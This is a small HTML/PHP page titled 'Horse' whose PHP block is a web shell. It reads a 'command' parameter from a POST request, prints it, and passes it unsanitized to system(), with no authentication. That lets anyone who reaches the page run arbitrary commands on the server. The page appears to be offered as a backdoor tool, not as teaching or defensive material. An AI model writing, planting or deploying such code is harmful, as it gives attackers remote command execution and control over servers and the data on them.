<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Horse</title>
    <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <link type="text/css" rel="styleSheet"  href="../src/css.css" />
    <style>
        html,body {
            background: #2c3e50;
            height: 100%;
        }
        .position {
            margin-left: 35%;
            margin-top: 30%;
        }
        .footer-position {
            margin-left: 45%;
        }
    </style>
</head>

<body>
<div class="container">
        <div class="position col-md-6 col-centered">
                <?php
                //class=" center-block col-sm-9
                $command = $_POST['command'];
                echo "<div style='font-size: 20px; color: white; margin-bottom: 15px;'>";
                    echo "command is: ".$command."<br>";
                echo "</div>";
                echo "<pre>";
                echo "<div style='font-size: 20px;'>";
                $last_line = system("$command");
                echo "</div>";
                echo '</pre>';
                ?>
        </div>
</div>
<div class="footer-position row-centered">
    <footer style="color: #bdc3c7;font-size: 13px; margin-top: 400px">created by: GreyBig</footer>
</div>
</body>

</html>



